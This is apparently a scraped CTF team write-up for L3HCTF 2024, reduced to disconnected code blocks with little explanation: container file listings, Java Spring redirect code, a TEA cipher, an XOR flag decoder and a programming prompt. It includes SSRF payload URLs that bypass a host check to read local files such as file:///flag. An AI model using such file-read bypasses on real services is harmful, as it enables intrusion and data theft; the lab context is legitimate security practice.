# L3HCTF 2024  WriteUp By Mini-Venom

> 原文: https://www.ctfiot.com/161564.html
> ID: 161564

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组


```
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
```



```
/usr/local/lib/node_modules/npm/node_modules/tar/lib/get-write-flag.js
/usr/local/lib/node_modules/npm/node_modules/@colors/colors/lib/system/has-flag.js
/usr/local/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/calc-dep-flags.js
/usr/local/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/reset-dep-flags.js
/usr/local/include/node/cppgc/internal/atomic-entry-flag.h
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/kpageflags
```



```
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/HQEJT3S2NCMCVKGHH4SF3RDVMA:/var/lib/docker/overlay2/l/6KYM5WPXYKTWZWALJBOVWBUEVZ:/var/lib/docker/overlay2/l/OXENVSFPHLOFB2X2HUH62P74JQ:/var/lib/docker/overlay2/l/ZPW4OHQ6XGZQRWP4SBGWSWYIAM:/var/lib/docker/overlay2/l/AHHJVJDTXW3SM5ZVQ6EVC6RCOY,upperdir=/var/lib/docker/overlay2/514c0d3ab08f9e3ac0044a6a12f363f91f2dca87cef7d29ae2af8d3e4cbf56ea/diff,workdir=/var/lib/docker/overlay2/514c0d3ab08f9e3ac0044a6a12f363f91f2dca87cef7d29ae2af8d3e4cbf56ea/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
cgroup /sys/fs/cgroup/rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/vda1 /app ext4 rw,relatime,errors=remount-ro 0 0
/dev/vda1 /etc/hostname ext4 rw,relatime,errors=remount-ro 0 0
proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /sys/firmware tmpfs ro,relatime 0 0
```



```
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
```



```
if (!request.getRequestURI().equals("/private") && !request.getRequestURI().equals("/test")) {
   return true;
} else {
   response.setStatus(418);
   return false;
}
```



```
@GetMapping({"/test"})
public String test(@RequestParam(name="redirect",required = true) String redirect) {
   String url = (String)CacheMap.getInstance().get(redirect);
   if (url == null) {
      return "url not found";
   } else {
      UriComponents uri = UriComponentsBuilder.fromUriString(url).build();
      String paramUrl = (String)uri.getQueryParams().getFirst("url");
      if (paramUrl != null) {
         UriComponents newUri = UriComponentsBuilder.fromUriString(paramUrl).build();
         String newHost = newUri.getHost();
         if (newHost == null || !newHost.equals(this.BaseURL)) {
            return "url is invalid";
         }
      }
```



```
http://localhost:8080/private/?url=http://www.example.com&url=file:/
//flag
```



```
private static final Pattern URI_PATTERN = Pattern.compile("^(([^:/?#]+):)?(//(([^@\[/?#]*)@)?(\[[\p{XDigit}:.]*[%\p{Alnum}]*]|[^\[/?#:]*)(:(\{[^}]+\}?|[^/?#]*))?)?([^?#]*)(\?([^#]*))?(#(.*))?");
Assert.notNull(uri, "URI must not be null");
Matcher matcher = URI_PATTERN.matcher(uri);
if (matcher.matches()) {
    UriComponentsBuilder builder = new UriComponentsBuilder();
    String scheme = matcher.group(2);
    String userInfo = matcher.group(5);
    String host = matcher.group(6);
    String port = matcher.group(8);
    String path = matcher.group(9);
    String query = matcher.group(11);
    String fragment = matcher.group(13);
    boolean opaque = false;
    String ssp;
    if (StringUtils.hasLength(scheme)) {
        ssp = uri.substring(scheme.length());
        if (!ssp.startsWith(":/")) {
            opaque = true;
        }
    }
```



```
http://localhost:8080/private/?%75%72%6c=file:///flag
```



```
#include <tchar.h>
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <conio.h>
#include <iostream>
```



```
#include <stdio.h>
#include <stdint.h>
void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])
{
    unsigned int i;
    uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x9E3779B9;
    for (i = 0; i < num_rounds; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
    }
    v[0] = v0; v[1] = v1;
}
```



```
s = 'JFYvMVU5QDoNQjomJlBULSQaCihTAFY='
s = [0x24,0x56,0x2f,0x31,0x55,0x39 ,0x40 ,0x3a ,0x0d ,0x42 ,0x3a ,0x26 ,0x26 ,0x50 ,0x54 ,0x2d ,0x24 ,0x1a ,0x0a ,0x28 ,0x53 ,0x00 ,0x56]
t = "secret"
for i in range(len(s)):
    print(chr((s[i])^ord(t[i%len(t)])),end="")
#W3LC0M3_n0_RU57_AnyM0r3
```



```
Problem Description:
Dr. Dai raises many Pals for his scientific research. As Dr. Dai is a loving person, he prepares food for these Pals every day.
Now we have $a$ Pals that only love to eat meat, $b$ Pals that absolutely do not eat meat, and $c$ Pals that eat anything.
The East-1th student canteen provides $m$ types of dishes and stipulates that each dish can only be bought once. The $i$-th dish has a price $c_i$, and has a character $A$ or $B$, indicating whether it is a vegetarian dish or a meat dish.
Now, Dr. Dai hopes to feed as many Pals as possible and, given the limited research funds, also hopes to minimize the cost under this premise. Please calculate the maximum number of Pals he can feed, and the minimum amount of money he needs to spend in this situation.
Input Format:
The first line contains three integers a b c
The next line is an integer m
The following m lines, each representing the value and category of the food, A for vegetarian, B for meat.
Output Format:
Two numbers, representing the number of Pals that can be fed and the total cost, respectively.
Tips:
For 10% of the data, it is guaranteed that a=b=0
For 30% of the data, it is guaranteed that 1 <= a,b,c <= 100, 1 <= m <= 100
For 100% of the data, it is guaranteed that 1 <= a,b,c <= 10^5, 1 <= m <= 3 * 10^5
All ci <= 10^9
pleas output the solution cpp code
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/2-1707352539.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/3-1707352540.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/0-1707352541.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/7-1707352541.jpeg)